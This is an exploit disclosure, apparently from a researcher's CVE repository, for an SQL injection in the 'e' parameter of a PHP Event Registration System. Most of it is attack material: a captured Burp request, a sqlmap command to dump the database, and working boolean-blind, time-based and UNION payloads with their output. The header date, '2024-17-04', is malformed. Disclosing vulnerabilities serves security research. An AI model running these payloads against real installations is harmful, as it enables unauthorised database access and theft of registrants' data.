# Event Registration System - SQL Injection - 3
+ **Exploit Title:** Event Registration System - SQL Injection - 3
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/14884/event-registration-system-qr-code-php-free-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=14884&title=Event+Registration+System+with+QR+Code+in+PHP+Free+Source+Code
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Event Registration System allows SQL Injection via the 'e' parameter at "http://localhost/event/registrar/?page=registration&e=c4ca4238a0b923820dcc509a6f75849b". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/event/registrar/"
+ Click a random event
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /event/registrar/?page=registration&e=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'e' parameter to dump the database.
```
sqlmap -r r.txt -p e --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: e (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=registration&e=c4ca4238a0b923820dcc509a6f75849b' AND 5080=5080-- YzSR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=registration&e=c4ca4238a0b923820dcc509a6f75849b' AND (SELECT 2736 FROM (SELECT(SLEEP(5)))hmeO)-- dtyk

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: page=registration&e=-4565' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766a71,0x774b754656496946706f737958487478466d45517941654e6145737672546d486b5050466a4d7845,0x716a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[18:23:14] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:23:14] [INFO] fetching current database
current database: 'event_db'
```
+ current database: `event_db`

![Ekran görüntüsü 2024-05-18 222759](https://github.com/BurakSevben/CVEs/assets/117217689/943c3ab1-a010-4caf-86a4-71af5deaec4b)


